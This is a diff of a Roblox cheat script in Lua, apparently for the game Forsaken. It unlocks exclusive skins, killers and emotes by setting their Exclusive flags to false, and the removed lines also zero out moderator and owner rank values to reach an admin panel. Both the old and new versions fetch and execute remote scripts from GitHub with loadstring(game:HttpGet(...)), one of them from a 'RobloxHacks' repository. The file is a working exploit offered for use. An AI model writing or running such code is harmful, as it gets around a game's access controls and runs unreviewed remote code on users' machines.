@@ -1,238 +1,30 @@
--- script is now public
-wait(2.8) -- to fix the thing where the game brokes
-local Tworework = game:GetService("ReplicatedStorage").Assets.Survivors._SurvivorTwoTimeRework.Config
-local ArtN = game:GetService("ReplicatedStorage").Assets.Skins.Survivors["007n7"].Artist007n7.Config
-local MissTheQuiet = game:GetService("ReplicatedStorage").Assets.Emotes._MissTheQuiet
-local Subter = game:GetService("ReplicatedStorage").Assets.Emotes._Subterfuge
-local Silly = game:GetService("ReplicatedStorage").Assets.Emotes._SillyBilly
-local Shedself = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky._TruePlayerShedletsky.Config
-local Noli = game:GetService("ReplicatedStorage").Assets.Killers.__KillerNoli.Config
-local Ranks = game:GetService("ReplicatedStorage").Modules.Schematics.GroupRankTranslations
-local Hover = game:GetService("ReplicatedStorage").Modules.Misc.CharacterHovering
-local Network = game:GetService("ReplicatedStorage").Modules.Network
-local JohnGirl = game:GetService("ReplicatedStorage").Assets.Skins.Killers.JohnDoe._MaineJohnDoe.Config
-local JohnSK = game:GetService("ReplicatedStorage").Assets.Skins.Killers.JohnDoe.SK.Config
-local JohnWither = game:GetService("ReplicatedStorage").Assets.Skins.Killers.JohnDoe.ChristmasJohnDoe.Config
-local AnnihilationJohnDoe = game:GetService("ReplicatedStorage").Assets.Skins.Killers.JohnDoe.AnnihilationJohnDoe.Config
-local JasonDeadRabbits = game:GetService("ReplicatedStorage").Assets.Skins.Killers.Jason.DeadRabbitsJason.Config
-local MysticJason = game:GetService("ReplicatedStorage").Assets.Skins.Killers.Jason._MysticJason.Config
-local TruePlayerTaph = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Taph._TruePlayerTaph.Config
-local Wither1x1x1x1 = game:GetService("ReplicatedStorage").Assets.Skins.Killers["1x1x1x1"].Christmas1x1x1x1.Config
-local Yourself1x1x1x1 = game:GetService("ReplicatedStorage").Assets.Skins.Killers["1x1x1x1"].Player1x1x1x1.Config
-local Flandre = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd.FlandreC00l.Config
-local ReworkMafioso = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd.MafiosoC00l.Config
-local ReworkMafioso2 = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd.MafiosoC00l.Config
-local LawBreakerCool = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd.OutlawedC00l.Config
-local YourselfCoolkidd = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd._PlayerC00l.Config
-local ArtBuilder = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Builderman.ArtistBuilderman.Config
-local SBM = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Builderman.AstronautBuilderman.Config
-local TestingBuilder = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Builderman.TesterBuilderman.Config
-local UnsnalBuilderMan = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Builderman._UnusualBuilderman.Config
-local ArtChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance.ArtistChance.Config
-local IsaacChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance.IsaacChance.Config
-local TakeAChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance.TakeAChanceChance.Config
-local CosplayChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance.PlayerChance.Config
-local Eww = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance.TwiddleChance.Config
-local CowboyChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance._CowboyChance.Config
-local CassidyChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance._CassidyChance.Config
-local LawBreakerChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance._OutlawChance.Config
-local TrueCosplayChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance._TruePlayerChance.Config
-local PinkDayChance = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Chance._PinkiePieChance.Config
-local kaiserdegurechaff = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Dusekkar._kaiserdegurechaffDusekkar.Config
-local DusekkarLockedIn = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Dusekkar._GhosdeeriIfTheyLockedIn.Config
-local ArtElloit = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Elliot.ArtistElliot.Config
-local JimmyElloit = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Elliot.JimothyElliot.Config
-local PlayerElloit = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Elliot._PlayerElliot.Config
-local SorcererGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337.SorcererGuest.Config
-local ArtGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337.ArtistGuest.Config
-local DemonGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337._DemomanGuest.Config
-local LockedinGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337._Guest1337IfHeLockedIn.Config
-local PlayerGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337._PlayerGuest.Config
-local CheifGuest = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Guest1337._ChiefGuest.Config
-local ArtNoob = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Noob.ArtistNoob.Config
-local EasterNoob = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Noob.EasterNoob.Config
-local ElsenNoob = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Noob.ElsenNoob.Config
-local RaimbowNoob = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Noob.RainbowNoob.Config
-local Noob666 = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Noob._Noob666.Config
-local ArtS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.ArtistShedletsky.Config
-local NinjaS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.AwesomeNinjaShedletsky.Config
-local CrazyS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.CrazybloxShedletsky.Config
-local EDS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.EarthDayShedletsky.Config
-local RebS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.RebecaShedletsky.Config
-local SkiesS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky.SkiesShedletsky.Config
-local JohnS = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky._JohnWardShedletsky.Config
-local LockedInShedLetSky = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky._ShedletskyifHeLockedIn.Config
-local CosplayShedLetSky = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky._TruePlayerShedletsky.Config
-local RolandShedletsky = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.Shedletsky._RolandShedletsky.Config
-local TrueKittyTwoTime = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.TwoTime.ActualKittyTwoTime.Config
-local LofiTwoTime = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.TwoTime.LofiTwoTime.Config
-local LockedInTwoTime = game:GetService("ReplicatedStorage").Assets.Skins.Survivors.TwoTime.TwoTimeIfTheyLockedIn.Config
-local KillerKing = game:GetService("ReplicatedStorage").Assets.Killers.KillerKing.Config
-local Killer666 = game:GetService("ReplicatedStorage").Assets.Killers.__KillerGuest666.Config
-local JeffTheKiller = game:GetService("ReplicatedStorage").Assets.Killers.__KillerJeffTheKiller.Config
-local SonicExe = game:GetService("ReplicatedStorage").Assets.Killers.__KillerSonicExe.Config
-local ZombieKing = game:GetService("ReplicatedStorage").Assets.Killers.__KillerZombieKing.Config
-local OneTimeCooler = game:GetService("ReplicatedStorage").Assets.Skins.Killers.c00lkidd._OMTC00ler.Config
-local MileStoneTestJohnDoe = game:GetService("ReplicatedStorage").Assets.Skins.Killers.JohnDoe["25TestJohnDoe"].Config
-local PlayerJason = game:GetService("ReplicatedStorage").Assets.Skins.Killers.Jason.PlayerJason.Config
-local StreammerOnlyJasonSkin = game:GetService("ReplicatedStorage").Assets.Skins.Killers.Jason.InsaneStreamerJason.Config
-local OneEggs = game:GetService("ReplicatedStorage").Assets.Skins.Killers["1x1x1x1"].Eggs1x1x1x1.Config
-local MissTheQuiet = require(MissTheQuiet)
-local Subterfuge = require(Subter)
-local Billy = require(Silly)
-local rework = require(Tworework)
-local r = require(Ranks)
-local CharacterHover = require(Hover)
--- Unlock Killers and their skins
-local OMTC = require(OneTimeCooler)
-local MSTJD = require(MileStoneTestJohnDoe)
-local AHPS = require(PlayerJason) -- accture Hitbox Player Skin 
-local YATSW = require(StreammerOnlyJasonSkin)
-local EggGuy = require(OneEggs)
-local Noil = require(Noli)
-local King = require(KillerKing)
-local SixSixSix = require(Killer666)
-local Jeff = require(JeffTheKiller)
-local Sonic = require(SonicExe)
-local Zombie = require(ZombieKing)
-local y = require(YourselfCoolkidd)
-local l  = require(LawBreakerCool)
-local r2 = require(ReworkMafioso2)
-local r1 = require(ReworkMafioso)
-local f = require(Flandre)
-local a = require(Yourself1x1x1x1)
-local w = require(Wither1x1x1x1)
-local m = require(MysticJason)
-local d = require(JasonDeadRabbits)
-local b = require(AnnihilationJohnDoe)
-local e = require(JohnWither)
-local s = require(JohnSK)
-local g = require(JohnGirl)
--- now unlock all survivors skins
-local ab = require(ArtBuilder)
-local artzero = require(ArtN)
-local bsm = require(SBM)
-local t = require(TestingBuilder)
-local u =require(UnsnalBuilderMan)
-local atc = require(ArtChance)
-local ic = require(IsaacChance)
-local tac = require(TakeAChance)
-local cc = require(CosplayChance)
-local bro = require(Eww)
-local Cbc = require(CowboyChance)
-local cyc = require(CassidyChance)
-local lbc = require(LawBreakerChance)
-local tcc = require(TrueCosplayChance)
-local pdc = require(PinkDayChance)
-local dli = require(DusekkarLockedIn)
-local ae = require(ArtElloit)
-local je = require(JimmyElloit)
-local pe = require(PlayerElloit)
-local srg = require(SorcererGuest)
-local ag = require(ArtGuest)
-local dg = require(DemonGuest)
-local lig = require(LockedinGuest)
-local pg = require(PlayerGuest)
-local cfg = require(CheifGuest)
-local an = require(ArtNoob)
-local en = require(EasterNoob)
-local enn = require(ElsenNoob)
-local rn = require(RaimbowNoob)
-local sixn = require(Noob666)
-local sa = require(ArtS)
-local sn = require(NinjaS)
-local css = require(CrazyS)
-local esd = require(EDS)
-local reb = require(RebS)
-local skys = require(SkiesS)
-local bjg = require(JohnS) -- bjg means blame john guy
-local lis = require(LockedInShedLetSky)
-local cps = require(CosplayShedLetSky)
-local rls = require(RolandShedletsky)
-local tkt = require(TrueKittyTwoTime)
-local ltt = require(LofiTwoTime)
-local litt = require(LockedInTwoTime)
-local net = require(Network)
-local tpp = require(TruePlayerTaph)
-tpp.Exclusive = false;
-net.ServiceLive = true
-net.NetworkingConnection = true
-css.Exclusive = false;
-artzero.Exclusive = false;
-esd.Exclusive = false;
-reb.Exclusive = false;
-skys.Exclusive = false;
-bjg.Exclusive = false;
-lis.Exclusive = false;
-cps.Exclusive = false;
-rls.Exclusive = false;
-tkt.Exclusive = false;
-ltt.Exclusive = false;
-litt.Exclusive = false;
-ag.Exclusive = false;
-dg.Exclusive = false;
-lig.Exclusive = false;
-pg.Exclusive = false;
-cfg.Exclusive = false;
-an.Exclusive = false;
-en.Exclusive = false;
-enn.Exclusive = false;
-rn.Exclusive = false;
-sixn.Exclusive = false;
-sa.Exclusive = false;
-sn.Exclusive = false;
-ab.Exclusive = false;
-bsm.Exclusive = false;
-t.Exclusive = false;
-u.Exclusive = false;
-atc.Exclusive = false;
-ic.Exclusive = false;
-tac.Exclusive = false;
-cc.Exclusive = false;
-bro.Exclusive = false;
-Cbc.Exclusive = false;
-cyc.Exclusive = false;
-lbc.Exclusive = false;
-tcc.Exclusive = false;
-pdc.Exclusive = false;
-dli.Exclusive = false;
-ae.Exclusive = false;
-je.Exclusive = false;
-pe.Exclusive = false;
-MissTheQuiet.Exclusive = false;
-Subterfuge.Exclusive = false;
-rework.Exclusive = false;
-Billy.Exclusive = false;
-Noil.Exclusive = false;
-King.Exclusive = false;
-SixSixSix.Exclusive = false;
-Jeff.Exclusive = false;
-Sonic.Exclusive = false;
-Zombie.Exclusive = false;
-OMTC.Exclusive = false;
-MSTJD.Exclusive = false;
-AHPS.Exclusive = false;
-AHPS.Name = "Accture Hitbox Player Skin Lol"
-YATSW.Exclusive = false;
-EggGuy.Exclusive = false;
-y.Exclusive = false;
-l.Exclusive = false;
-r2.Exclusive = false;
-r1.Exclusive = false;
-f.Exclusive = false;
-a.Exclusive = false;
-w.Exclusive = false;
-m.Exclusive = false;
-d.Exclusive = false;
-b.Exclusive = false;
-e.Exclusive = false;
-s.Exclusive = false;
-g.Exclusive = false;
--- access admin panel
-local NotifyModule:NotifyModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/PeaPattern/notif-lib/main/main.lua"))()
-NotifyModule:Notify("make sure to also check skins and emotes (dont press skins on devs and upcoming characters)", 5)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+wait(3.9)
 
-r.Moderator = 0
-r.HeadModerator = 0
-r.Developer = 0
-r.Owner = 0
+local assetsFolder = ReplicatedStorage:WaitForChild("Assets")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TouseefX/TouseefX/refs/heads/main/RobloxHacks/view.lua",true))()
+
+local function requireConfigModules(folder)
+    for _, asset in ipairs(folder:GetChildren()) do
+        if asset:IsA("ModuleScript") and asset.Name == "Config" then
+            local success, module = pcall(require, asset)           
+            if success and module and type(module) == "table" then
+                wait(0.01)
+                module.Exclusive = false
+                print(asset.Name .. " Exclusive set to false.")
+            elseif not success then
+                warn("Failed to require " .. asset.Name .. ": " .. module)
+            else
+                warn(asset.Name .. " is not a valid module.")
+            end
+        elseif asset:IsA("Folder") then
+            requireConfigModules(asset)
+        end
+    end
+end
+
+if assetsFolder then
+    requireConfigModules(assetsFolder)
+else
+    warn("Assets folder not found in ReplicatedStorage.")
+end
